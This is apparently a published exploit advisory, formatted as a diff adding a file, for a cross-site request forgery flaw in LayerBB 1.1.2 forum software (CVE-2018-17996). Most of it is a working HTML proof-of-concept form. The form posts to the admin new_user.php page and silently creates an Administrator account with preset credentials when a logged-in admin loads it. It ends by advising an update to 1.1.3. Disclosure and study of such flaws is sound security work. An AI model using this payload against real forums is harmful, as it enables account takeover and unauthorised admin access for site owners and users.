@@ -1,0 +1,38 @@
+# Exploit Title: LayerBB 1.1.2 - Cross-Site Request Forgery
+# Date: 10/4/2018
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Contact: 0xB9[at]pm.me
+# Software Link: https://forum.layerbb.com
+# Version: 1.1.2
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2018-17996
+
+
+1. Description:
+LayerBB is a free open-source forum software, the CSRF allows creating a admin user.
+ 
+
+2. Proof of Concept:
+
+<!-- Create Admin User -->  
+<html>
+  <body>
+	<form action="http://localhost/[path]/admin/new_user.php" method="POST">
+        <label for="username">Username</label>
+        <input name="username" id="username" value="test" type="text">
+        <label for="password">Password</label>
+        <input name="password" id="password" value="password123" type="password">
+        <label for="email">Email Address</label>
+        <input name="email" id="email" value="test@localhost.co" type="text">               
+        <label for="usergroup">Usergroup</label><br>
+        <select name="usergroup" id="usergroup" style="width:100%;"><option value="4">Administrator</option></select><br><br>
+        <input name="create" value="Create User" type="submit">
+    </form>
+  </body>
+</html>
+<!-- Create Admin User End -->
+
+
+3. Solution:
+Update to 1.1.3
